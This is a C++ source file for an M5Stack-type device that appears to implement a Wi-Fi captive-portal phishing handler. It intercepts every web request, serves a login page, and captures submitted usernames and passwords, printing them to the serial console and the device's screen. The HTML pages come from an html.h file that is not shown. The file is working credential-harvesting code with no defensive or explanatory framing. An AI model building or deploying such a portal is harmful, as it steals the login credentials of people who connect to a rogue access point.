#include "html.h"

class CaptiveRequestHandler : public AsyncWebHandler
{
public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}

    bool canHandle(AsyncWebServerRequest *request)
    {
        return true;
    }

    void handleRequest(AsyncWebServerRequest *request)
    {

        String inputUsername;
        String inputPassword;

        if (request->hasParam("username"))
        {
            inputUsername = request->getParam("username")->value();
            inputPassword = request->getParam("password")->value();
            Serial.println("Got username: " + inputUsername);
            Serial.println("Got password: " + inputPassword);
            M5.lcd.println(inputUsername);
            M5.lcd.println(inputPassword);

            request->send_P(200, "text/html", success_html);
        }
        else
        {
            // M5.lcd.println("Got index web req");
            Serial.println("Got index web req");
            {
                request->send_P(200, "text/html", index_html);
            }
        }
    }
};